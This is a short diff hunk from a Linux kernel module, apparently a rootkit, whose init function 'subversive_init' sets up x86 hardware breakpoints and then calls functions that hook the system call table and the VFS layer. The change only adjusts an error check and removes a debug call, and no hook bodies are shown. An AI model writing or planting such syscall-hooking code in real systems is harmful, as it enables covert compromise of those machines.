@@ -21,10 +21,8 @@ static int __init subversive_init(void)
 		return 0;
 
 	ret = x86_hw_breakpoint_init();
-	if (ret)
+	if (ret < 0)
 		return 0;
-
-	x86_hw_breakpoint_debug();
 
 	hook_sys_call_table();
 	vfs_hook();
